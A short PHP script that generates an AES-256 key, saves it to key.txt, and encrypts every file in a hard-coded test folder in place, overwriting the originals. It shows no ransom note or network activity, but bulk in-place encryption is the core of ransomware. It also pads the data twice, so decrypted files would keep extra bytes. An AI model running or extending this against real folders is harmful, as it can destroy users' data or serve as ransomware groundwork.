<?php

function generateKey() {
    return openssl_random_pseudo_bytes(32);
}

function padData($data) {
    $blockSize = 16;
    $paddingLength = $blockSize - (strlen($data) % $blockSize);
    return $data . str_repeat(chr($paddingLength), $paddingLength);
}

function encryptFile($filePath, $key) {
    $iv = openssl_random_pseudo_bytes(16);
    $data = file_get_contents($filePath);
    $paddedData = padData($data);
    $encryptedData = openssl_encrypt($paddedData, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);

    file_put_contents($filePath, $iv . $encryptedData);
}

function processFolder($folderPath, $key) {
    $files = scandir($folderPath);
    foreach ($files as $file) {
        $filePath = $folderPath . DIRECTORY_SEPARATOR . $file;
        if (is_file($filePath)) {
            encryptFile($filePath, $key);
        }
    }
}

function main() {
    $folderPath = "E:/Test/Folder";
    $parentPath = dirname($folderPath);
    $keyFilePath = $parentPath . DIRECTORY_SEPARATOR . "key.txt";

    $key = generateKey();
    file_put_contents($keyFilePath, $key);

    processFolder($folderPath, $key);
}

main();
?>
